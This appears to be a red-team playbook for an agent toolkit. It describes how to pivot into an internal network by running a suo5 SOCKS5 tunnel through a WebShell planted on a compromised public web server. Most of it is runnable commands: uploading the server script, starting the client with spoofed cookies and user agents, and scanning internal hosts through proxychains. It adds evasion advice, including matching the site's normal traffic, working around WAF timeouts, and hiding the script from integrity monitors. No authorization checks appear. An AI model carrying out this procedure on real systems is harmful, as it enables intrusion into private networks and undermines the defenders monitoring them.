# suo5 Tunnel: SOCKS5 over a WebShell

Turns an encrypted WebShell on `TARGET` into a SOCKS5 endpoint on this host by running the `suo5` client against the suo5 server component dropped beside that WebShell. Because every byte travels as ordinary HTTP requests and responses to an already-reachable script, the path survives egress rules that permit nothing but web traffic to that virtual host, and internal hosts behind the web server become reachable through `127.0.0.1:LISTEN_PORT`. The entry point is recorded with `redteam_webshell_add` and the relay as a `tunnel` row with `kind=suo5` and `entry_kind=target-http`.

## When to use

- The only usable channel into the network is a WebShell on a public web server, and the internal segment is reachable from that server.
- You need SOCKS5 for TCP tooling and a WebShell upload primitive already exists (Behinder or Godzilla console shell, so the operator can re-enter the same host later).
- Egress filtering blocks new outbound ports entirely; the WebShell URL is the single allowed destination.
- A short-lived pivot is enough and a standalone binary on the target is not desirable — suo5's server side is a server-side script, not a process.
- Not for UDP or ICMP; the transport is HTTP request/response over TCP, so raw-socket scans belong to `ligolo-proxy`.
- Not for a target whose web tier cannot reach the internal segment; verify with a single TCP connect before building the tunnel.

## Prerequisites

- Client binary: `bash $DSH_HOME/redteam/setup.sh --yes` installs `$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64`; if the script cannot fetch it, take the release asset of the same name, place it at that path, and `chmod +x`. It is a static Go build with no runtime dependency.
- Server component: the matching `suo5.jsp` / `suo5.php` / `suo5.aspx` from the same release, uploaded through the existing WebShell or file-write primitive. Version mismatch between client and server script is the most common cause of a silent failure.
- The encType of the entry: the host should already be held through a Behinder or Godzilla encrypted WebShell so the library entry is usable by the console. A one-line eval shell is not a reusable entry — register the real console shell when you have it.
- URL, parameter and key of the WebShell: `-t` takes the full script URL, and any session cookie or access header must be passed explicitly.
- Nothing is mandatory and each step has a fallback. suo5 server script blocked by upload filtering → drop a `.ashx`/`.php` variant, or fall back to Neo-ReGeorg style chunked transport. SOCKS5 blocked by the client host policy → run the client on `VPS_IP` and consume it there through `ssh -L`. `setup.sh` unavailable → any suo5 release client works against its own server script.

## Workflow

1. Confirm the entry WebShell is alive and stable before starting anything — an unstable shell produces transport errors that look like client bugs.

```bash
for i in 1 2 3; do
  curl -s -o /dev/null -w '%{http_code} %{size_download}\n' \
    -H 'Cookie: SESSION=COOKIE' "http://TARGET/shell.jsp"
  sleep 1
done
```

   The three responses must agree on status and roughly on size. A wobbling size means a WAF or a load-balanced backend is in the way.

2. Upload the suo5 server script next to the WebShell, then fetch it once so you know the URL resolves to the script and not to a 404 page.

```bash
curl -s -o /dev/null -w '%{http_code}\n' "http://TARGET/suo5.jsp"
```

3. Start the client and bind SOCKS5 on loopback. Default mode negotiates full or half duplex automatically; pin the mode only when you have a reason.

```bash
$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64 \
  -t http://TARGET/suo5.jsp \
  -l 127.0.0.1:LISTEN_PORT \
  --mode auto \
  2>&1 | tee RESULT_DIR/suo5-LISTEN_PORT.log
```

4. When the WebShell needs a cookie, a specific verb or a user agent to look normal, pass all of them so the traffic matches what the site already sends.

```bash
$DSH_HOME/redteam/toolkit/suo5/suo5-linux-amd64 \
  -t https://DOMAIN/suo5.jsp \
  -l 127.0.0.1:LISTEN_PORT \
  --method POST \
  --header "Cookie: SESSION=COOKIE" \
  --header "X-Requested-With: XMLHttpRequest" \
  --ua "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  --auth OPERATOR:LPORT_SECRET \
  --debug
```

   `--auth` puts basic auth in front of the local SOCKS5 listener so another local user cannot borrow the tunnel. `--debug` writes the request/response shape — keep it on only while diagnosing, since it is verbose.

5. Prove the tunnel with a request that only succeeds through the web server's own network position.

```bash
curl -s --max-time 10 --socks5-hostname 127.0.0.1:LISTEN_PORT http://TARGET_IP:PORT/ | head -20
```

6. Write the proxychains profile used by every following internal command, and scan in connect mode because the proxy cannot carry SYN.

```bash
cat > RESULT_DIR/proxychains-LISTEN_PORT.conf <<'EOF'
strict_chain
proxy_dns
tcp_read_time_out 30000
tcp_connect_time_out 15000
[ProxyList]
socks5 127.0.0.1 LISTEN_PORT
EOF
proxychains4 -f RESULT_DIR/proxychains-LISTEN_PORT.conf nmap -sT -Pn -p PORT TARGET_IP
```

7. Keep it alive: run the client inside `tmux`, and let the heartbeat do its job. If the WebShell backend drops idle flows, lower the concurrency instead of disabling the heartbeat.

```bash
tmux new -s suo5
# inside: re-run the client command from step 4, then detach with Ctrl-b d
tmux ls
```

8. Register the entry and the relay before starting internal enumeration, so parallel work reuses one path instead of building a second one.

```text
redteam_webshell_add  url=http://TARGET/suo5.jsp  shell_type=behinder  pass_key=KEY  privilege=www-data
redteam_tunnel_add    kind=suo5  listen=127.0.0.1:LISTEN_PORT  entry=http://TARGET/suo5.jsp  reach=10.0.0.0/8  entry_kind=target-http  webshell_id=<id>
```

## Output and evidence

- `RESULT_DIR/suo5-LISTEN_PORT.log` — client transcript: handshake, chosen mode, per-request latency, transport errors.
- `RESULT_DIR/proxychains-LISTEN_PORT.conf` — the profile every internal command references.
- `RESULT_DIR/nmap-suo5-TARGET_IP.txt` — the first scan completed through the SOCKS endpoint.
- `redteam_webshell_add` for the entry, with `shell_type` limited to `behinder` or `godzilla` for a reusable entry, `pass_key`, `privilege` as observed, and `secret_ref` pointing at `RESULT_DIR/ws-TARGET_IP.txt`.
- `redteam_tunnel_add` with `kind=suo5`, `listen=127.0.0.1:LISTEN_PORT`, `entry` = the WebShell URL, `reach` = the CIDR you actually tested, `entry_kind=target-http`, and `webshell_id` referencing the entry row.
- `redteam_evidence_record` with `operation=suo5_tunnel_up`, `authority=request-replay`, `confidence=observed`, the request/response pair that proved internal reachability inside `result`.
- `redteam_asset_add` each internal host reached, `provenance=active`, `tool=suo5`.
- `redteam_session_check` after idle gaps; the tunnel row flips to offline when the script stops answering.

## Failure modes

- `404 Not Found` on the script URL → the suo5 server script was not uploaded, or the path was rewritten → request the exact path you wrote, and check whether the site appends `.jsp;` or a rewrite rule.
- Client starts but every request returns an HTML page of the same length → the URL resolves to a generic handler, not the script → confirm with `curl -i` and inspect the body for the expected marker instead of the status code alone.
- `handshake failed` / `invalid response` right after start → client and server script are from different releases → re-upload the matching server component.
- Connection works for a minute then stalls → the heartbeat is being eaten by a WAF or a proxy idle timeout → keep the heartbeat on, reduce concurrency, and add the headers the site normally sends.
- SOCKS5 answers but internal connects time out → the web server itself cannot reach that host, or the port is filtered → test from the WebShell (`curl`/`nc` through the console shell) before blaming the tunnel.
- `bind: address already in use` on `-l` → a previous client owns the port → `ss -lntp | grep LISTEN_PORT`, kill the stale pid, restart.
- Uploaded script is removed within minutes → an integrity monitor is reverting web roots → choose a directory the site writes to itself (upload, cache, temp) and re-check after a short wait.
- Local SOCKS5 usable by any local user → `--auth` was omitted → restart with `--auth OPERATOR:LPORT_SECRET` and update the proxychains profile to include credentials.

## Notes

- One client per WebShell. Two clients against the same script multiply requests, which is the loudest possible signal on the web server.
- Rate: every internal connection is an HTTP request, so keep `THREADS` low (`ffuf -t THREADS`, `nmap --min-rate RATE`) and expect tens of milliseconds of overhead per connection. Wide scans through suo5 are slower than through a TUN relay.
- Opsec: traffic must match the site's baseline — keep the same virtual host, a plausible User-Agent, and the cookie of a normal session. Avoid hitting the same script path from two source addresses at once.
- Idempotency: restarting the client rebinds the same local port and fails if the old process is alive; check with `pgrep -af suo5` first. The server script itself is stateless, so restarting the client is always safe.
- Resume: a dropped client is recoverable by restarting it against the same URL; the server script needs no re-upload. Anything already running through the SOCKS endpoint breaks and must be re-run.
- Cleanup: kill the client, delete the uploaded server script from the target web root (a leftover script is a permanent backdoor on a public host), remove the proxychains profile, and `redteam_tunnel_update` with `id` and `status=down`. Update the webshell row with `redteam_webshell_update` if the entry was removed.
